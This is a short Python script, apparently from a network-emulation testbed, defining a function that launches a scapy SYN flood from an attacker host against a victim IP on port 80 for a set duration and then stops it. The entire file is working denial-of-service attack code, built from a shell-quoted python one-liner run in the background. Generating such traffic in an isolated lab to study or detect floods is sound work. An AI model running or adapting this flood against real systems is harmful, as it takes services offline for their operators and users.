from scapy.all import Ether, IP, TCP, sendp
import time
import subprocess

def run_attack(attacker_host, victim_ip, duration):
    print(f"Starting SYN Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
    # The original scapy_command was: "sendp(Ether()/IP(dst='10.0.0.6')/TCP(dport=80, flags='S'), loop=1, inter=0.001)"
    # We need to adapt this to use the victim_ip and run for the specified duration.
    # Use attacker_host.popen to run the scapy command in the background.
    # The command needs to be properly quoted for the shell.
    scapy_cmd = f"from scapy.all import *; sendp(Ether()/IP(dst='{victim_ip}')/TCP(dport=80, flags='S'), loop=1, inter=0.001, verbose=0)"
    process = attacker_host.popen(f'python3 -c "{scapy_cmd}"', shell=True)
    
    time.sleep(duration)
    process.send_signal(subprocess.SIGINT) # Attempt to stop Scapy processes gracefully
    process.wait() # Wait for the process to terminate
    print(f"SYN Flood from {attacker_host.name} to {victim_ip} finished.")